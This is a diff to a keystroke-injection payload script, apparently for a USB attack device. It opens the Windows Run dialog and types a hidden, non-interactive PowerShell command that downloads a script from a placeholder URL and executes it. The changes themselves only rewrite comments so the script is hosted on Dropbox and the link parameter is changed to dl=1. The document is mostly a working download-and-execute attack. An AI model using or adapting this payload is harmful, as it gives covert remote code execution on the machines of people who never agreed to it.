@@ -4,9 +4,9 @@ REM --- allow user to prevent payload execution by tapping CAPSLOCK during inser
 WAITFOR_INIT
 ALLOW_EXIT
 
-REM --- download and execute powershell script hosted on a web server of your choice ---
+REM --- download and execute powershell script hosted on your dropbox account ---
 REM --- you MUST replace URL_OF_YOUR_SCRIPT_HERE with an actual URL for this to work ---
-REM --- you may need to add or change parameters in that URL, eg set ?dl=1 or &dl=1 ---
+REM --- you will have to replace parameter &dl=0 in your dropbox link to &dl=1 ---
 GUI r
 DELAY 100
 STRING powershell -noP -wind hidden -nonI $script = iwr \"URL_OF_YOUR_SCRIPT_HERE\"; iex $script
